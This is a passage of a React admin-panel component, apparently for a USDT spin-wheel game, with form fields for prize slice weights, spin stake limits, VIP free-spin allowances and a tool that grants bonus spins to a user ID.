                  <input
                    type="number"
                    step="0.1"
                    value={slice.prizeValue}
                    onChange={(e) => handleSliceChange(idx, 'prizeValue', parseFloat(e.target.value) || 0)}
                    style={{
                      width: '80px',
                      padding: '6px 8px',
                      borderRadius: '6px',
                      backgroundColor: '#1E293B',
                      border: '1px solid #475569',
                      color: '#F8FAFC',
                      fontSize: '12px'
                    }}
                  />
                </td>
                <td style={{ padding: '8px 10px' }}>
                  <input
                    type="number"
                    value={slice.weight}
                    onChange={(e) => handleSliceChange(idx, 'weight', parseInt(e.target.value, 10) || 0)}
                    style={{
                      width: '70px',
                      padding: '6px 8px',
                      borderRadius: '6px',
                      backgroundColor: '#1E293B',
                      border: '1px solid #475569',
                      color: '#FDE047',
                      fontWeight: 700,
                      fontSize: '12px'
                    }}
                  />
                </td>
                <td style={{ padding: '8px 10px', fontWeight: 700, color: '#38BDF8' }}>
                  {slice.probabilityPercent}%
                </td>
                <td style={{ padding: '8px 10px' }}>
                  <input
                    type="checkbox"
                    checked={slice.isJackpot || false}
                    onChange={(e) => handleSliceChange(idx, 'isJackpot', e.target.checked)}
                  />
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ========================================================================= */}
      {/* ⚙️ SECTION 3: ACTIVATION LIMITS & VIP ALLOWANCES */}
      {/* ========================================================================= */}
      {config && (
        <div
          style={{
            backgroundColor: '#0F172A',
            border: '1px solid #334155',
            borderRadius: '16px',
            padding: '16px',
            display: 'flex',
            flexDirection: 'column',
            gap: '16px'
          }}
        >
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '14px', fontWeight: 700, color: '#FEF08A', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <Settings size={16} /> Spin Activation Stake Limits & VIP Daily Allowances
            </span>
            <button
              onClick={handleSaveConfig}
              style={{
                padding: '6px 12px',
                backgroundColor: '#3B82F6',
                border: 'none',
                borderRadius: '6px',
                color: '#FFFFFF',
                fontSize: '12px',
                fontWeight: 700,
                cursor: 'pointer'
              }}
            >
              Save Perks
            </button>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '12px' }}>
            <div>
              <label style={{ fontSize: '11px', color: '#FEF08A', fontWeight: 700, display: 'block', marginBottom: '4px' }}>
                Min Spin Stake (USDT)
              </label>
              <input
                type="number"
                min={1}
                max={100}
                value={config.minBetUsdt || 1}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    minBetUsdt: Math.max(1, parseInt(e.target.value, 10) || 1)
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #F59E0B',
                  color: '#FEF08A',
                  fontWeight: 700
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '11px', color: '#FEF08A', fontWeight: 700, display: 'block', marginBottom: '4px' }}>
                Max Spin Stake (USDT)
              </label>
              <input
                type="number"
                min={1}
                max={1000}
                value={config.maxBetUsdt || 100}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    maxBetUsdt: Math.max(1, parseInt(e.target.value, 10) || 100)
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #F59E0B',
                  color: '#FEF08A',
                  fontWeight: 700
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                Level 1 Free Daily Spins
              </label>
              <input
                type="number"
                value={config.dailyFreeSpinsPerLevel?.level1 ?? 1}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    dailyFreeSpinsPerLevel: { ...config.dailyFreeSpinsPerLevel, level1: parseInt(e.target.value, 10) || 1 }
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #475569',
                  color: '#F8FAFC'
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                Level 2 Free Daily Spins
              </label>
              <input
                type="number"
                value={config.dailyFreeSpinsPerLevel?.level2 ?? 2}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    dailyFreeSpinsPerLevel: { ...config.dailyFreeSpinsPerLevel, level2: parseInt(e.target.value, 10) || 2 }
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #475569',
                  color: '#F8FAFC'
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                Level 3 Free Daily Spins
              </label>
              <input
                type="number"
                value={config.dailyFreeSpinsPerLevel?.level3 ?? 3}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    dailyFreeSpinsPerLevel: { ...config.dailyFreeSpinsPerLevel, level3: parseInt(e.target.value, 10) || 3 }
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #475569',
                  color: '#F8FAFC'
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                Level 4 Free Daily Spins
              </label>
              <input
                type="number"
                value={config.dailyFreeSpinsPerLevel?.level4 ?? 5}
                onChange={(e) =>
                  setConfig({
                    ...config,
                    dailyFreeSpinsPerLevel: { ...config.dailyFreeSpinsPerLevel, level4: parseInt(e.target.value, 10) || 5 }
                  })
                }
                style={{
                  width: '100%',
                  padding: '8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #475569',
                  color: '#F8FAFC'
                }}
              />
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 🎁 SECTION 4: MANUAL SPIN AIR-DROP TOOL */}
      {/* ========================================================================= */}
      <div
        style={{
          backgroundColor: '#0F172A',
          border: '1px solid #334155',
          borderRadius: '16px',
          padding: '16px'
        }}
      >
        <div style={{ fontSize: '14px', fontWeight: 700, color: '#FEF08A', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
          <Gift size={16} /> User Bonus Spin Air-drop Tool
        </div>
        <p style={{ margin: '0 0 12px 0', fontSize: '12px', color: '#94A3B8' }}>
          Grant bonus spin tickets directly to specific user accounts for promotions or compensation.
        </p>

        {grantSuccess && (
          <div
            style={{
              padding: '10px 14px',
              backgroundColor: 'rgba(34, 197, 94, 0.15)',
              border: '1px solid rgba(34, 197, 94, 0.4)',
              borderRadius: '8px',
              color: '#4ADE80',
              fontSize: '12px',
              marginBottom: '12px'
            }}
          >
            {grantSuccess}
          </div>
        )}

        <form onSubmit={handleManualGrant} style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', alignItems: 'flex-end' }}>
          <div style={{ flex: 1, minWidth: '200px' }}>
            <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>User ID / UUID</label>
            <input
              type="text"
              placeholder="e.g. 7f9d8a1c-..."
              value={targetUserId}
              onChange={(e) => setTargetUserId(e.target.value)}
              style={{
                width: '100%',
                padding: '8px 12px',
                borderRadius: '8px',
                backgroundColor: '#1E293B',
                border: '1px solid #475569',
                color: '#F8FAFC',
                fontSize: '12px'
              }}
            />
          </div>

          <div style={{ width: '110px' }}>
            <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>Spins Count</label>
            <input
              type="number"
              min="1"
              max="100"
              value={grantSpinsCount}
              onChange={(e) => setGrantSpinsCount(parseInt(e.target.value, 10) || 1)}
              style={{
                width: '100%',
                padding: '8px 12px',
                borderRadius: '8px',
                backgroundColor: '#1E293B',
                border: '1px solid #475569',
                color: '#F8FAFC',
                fontSize: '12px'
              }}
            />
          </div>

          <button
            type="submit"
            style={{
              padding: '9px 18px',
              background: 'linear-gradient(135deg, #10B981 0%, #059669 100%)',
              border: 'none',
              borderRadius: '8px',
              color: '#FFFFFF',
              fontSize: '12px',
              fontWeight: 800,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px'
            }}
          >
            <Plus size={14} /> Grant Spins
          </button>
        </form>
      </div>
    </div>
  );
};
